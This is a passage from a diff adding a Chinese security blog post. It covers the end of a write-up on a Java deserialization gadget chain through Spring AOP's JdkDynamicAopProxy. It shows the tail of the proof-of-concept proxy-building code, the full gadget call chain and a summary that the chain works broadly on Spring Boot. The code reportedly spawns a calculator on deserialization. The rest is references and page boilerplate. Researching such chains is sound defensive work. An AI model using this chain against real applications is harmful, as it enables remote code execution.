+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">proxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Object</span><span class="p">)</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">ClassLoader</span><span class="p">.</span><span class="na">getSystemClassLoader</span><span class="p">(),</span><span class="n">interface1</span><span class="p">,</span><span class="n">invocatinoHandler</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">proxy</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功在反序列化时弹出计算机。</p>
+<p>调试的唯一不同点就是如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503232835543.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503232835543"
+	
+	
+></p>
+<p>这里还是没有进入if语句，不知道为什么，但是后面gaoren帮我跑就能进入if语句。</p>
+<p>所以Gatget如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">JdkDynamicAopProxy</span><span class="err">#</span><span class="n">invoke</span><span class="p">()</span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">ReflectiveMethodInvocation</span><span class="err">#</span><span class="n">proceed</span><span class="p">()</span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">JdkDynamicAopProxy</span><span class="err">#</span><span class="n">invoke</span><span class="p">()</span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">AopUtils</span><span class="err">#</span><span class="n">invokeJoinpointUsingReflection</span><span class="p">()</span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AspectJAroundAdvice</span><span class="err">#</span><span class="n">invoke</span><span class="p">()</span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="n">AbstractAspectJAdvice</span><span class="err">#</span><span class="n">invokeAdviceMethod</span><span class="p">()</span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">AbstractAspectJAdvice</span><span class="err">#</span><span class="n">invokeAdviceMethodWithGivenArgs</span><span class="p">()</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="总结">总结
+</h5><p>非常有意思的链子呀，JdkDynamicAopProxy类真的强大，只要控制得好，可以调用任意类的任意方法，主要还是看触发invoke()的方法，因为我们可控反射中的invoke()中的类实例，非常有意思。</p>
+<p>最后，这个springAOP链是一个非常好用的类，基本上springboot的环境都能打，可以调用任意类的无参数方法。</p>
+<p>参考文章：
+<a class="link" href="https://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ</a></p>
+<p><a class="link" href="https://xz.aliyun.com/news/17640"  target="_blank" rel="noopener"
+    >https://xz.aliyun.com/news/17640</a></p>
+<p><a class="link" href="https://xz.aliyun.com/news/17530"  target="_blank" rel="noopener"
+    >https://xz.aliyun.com/news/17530</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/apache-tomcat-partial-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Apache Tomcat partial PUT文件上传反序列化漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/tomcat-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csession-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Tomcat PUT文件上传和Session 反序列化代码执行漏洞分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/tomcat%E5%85%B3%E9%94%AE%E7%9F%A5%E8%AF%86%E4%BA%86%E8%A7%A3/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Tomcat关键知识了解</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/hibernate%E7%BB%84%E4%BB%B6%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">hibernate组件的反序列化漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/jdk17%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%B0%84%E7%BB%95%E8%BF%87/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">JDK17下的反射绕过</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2025 Example Person
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
